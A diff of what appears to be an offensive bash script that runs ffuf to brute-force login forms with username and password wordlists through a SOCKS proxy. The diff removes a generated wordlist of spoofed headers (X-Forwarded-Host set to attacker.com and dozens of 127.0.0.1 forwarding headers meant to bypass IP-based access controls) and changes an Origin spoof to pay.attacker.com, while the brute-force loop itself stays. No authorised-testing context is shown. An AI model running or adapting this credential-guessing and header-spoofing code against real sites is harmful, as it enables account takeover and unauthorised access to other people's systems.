@@ -358,7 +358,7 @@ X-Forwarded-Host: attacker.com
 X-Forwarded-Port: 443
 X-Forwarded-Scheme: https
 Origin: null
-nullOrigin: [siteDomain].attacker.com
+nullOrigin: pay.attacker.com
 X-Frame-Options: Allow
 X-Forwarded-For: 127.0.0.1
 X-Client-IP: 127.0.0.1
@@ -585,56 +585,6 @@ HEADERS=(
   -H "Priority: u=0, i"
 )
 
-# Forwarded Header
-cat > /tmp/forwarded.txt << EOF
-X-Forwarded-Host: attacker.com
-X-Forwarded-Port: 443
-X-Forwarded-Scheme: https
-Origin: null
-nullOrigin: [siteDomain].attacker.com
-X-Frame-Options: Allow
-X-Forwarded-For: 127.0.0.1
-X-Client-IP: 127.0.0.1
-Client-IP: 127.0.0.1
-Proxy-Host: 127.0.0.1
-Request-Uri: 127.0.0.1
-X-Forwarded: 127.0.0.1
-X-Forwarded-By: 127.0.0.1
-X-Forwarded-For: 127.0.0.1
-X-Forwarded-For-Original: 127.0.0.1
-X-Forwarded-Host: 127.0.0.1
-X-Forwarded-Server: 127.0.0.1
-X-Forwarder-For: 127.0.0.1
-X-Forward-For: 127.0.0.1
-Base-Url: 127.0.0.1
-Http-Url: 127.0.0.1
-Proxy-Url: 127.0.0.1
-Redirect: 127.0.0.1
-Real-Ip: 127.0.0.1
-Referer: 127.0.0.1
-Referrer: 127.0.0.1
-Refferer: 127.0.0.1
-Uri: 127.0.0.1
-Url: 127.0.0.1
-X-Host: 127.0.0.1
-X-Http-Destinationurl: 127.0.0.1
-X-Http-Host-Override: 127.0.0.1
-X-Original-Remote-Addr: 127.0.0.1
-X-Original-Url: 127.0.0.1
-X-Proxy-Url: 127.0.0.1
-X-Rewrite-Url: 127.0.0.1
-X-Real-Ip: 127.0.0.1
-X-Remote-Addr: 127.0.0.1
-X-Custom-IP-Authorization: 127.0.0.1
-X-Originating-IP: 127.0.0.1
-X-Remote-IP: 127.0.0.1
-X-Original-Url: 127.0.0.1
-X-Forwarded-Server: 127.0.0.1
-X-Host: 127.0.0.1
-X-Forwarded-Host: 127.0.0.1
-X-Rewrite-Url: 127.0.0.1
-EOF
-
 # Run FFUF
 if [[ "$METHOD" == "get" ]]; then
     FFUF_URL="${FULL_ACTION}?${DATA}"
@@ -642,22 +592,18 @@ if [[ "$METHOD" == "get" ]]; then
          -w "$USERLIST:FUZZ1" \
          -w "$PASSLIST:FUZZ2" \
          -w "$UI:FUZZ3" \
-         -w "/tmp/forwarded.txt:FUZZ4" \
          -x "socks4://127.0.0.1:16379" \
          -X GET \
          -ac -c -r -mc 200 \
-         -H "FUZZ4" \
          "${HEADERS[@]}"
 else
     ffuf -u "$FULL_ACTION" \
          -w "$USERLIST:FUZZ1" \
          -w "$PASSLIST:FUZZ2" \
          -w "$UI:FUZZ3" \
-         -w "/tmp/forwarded.txt:FUZZ4" \
          -x "socks4://127.0.0.1:16379" \
          -X POST -d "$DATA" \
          -ac -c -r -mc 200 \
-         -H "FUZZ4" \
          "${HEADERS[@]}"
 fi
 ```
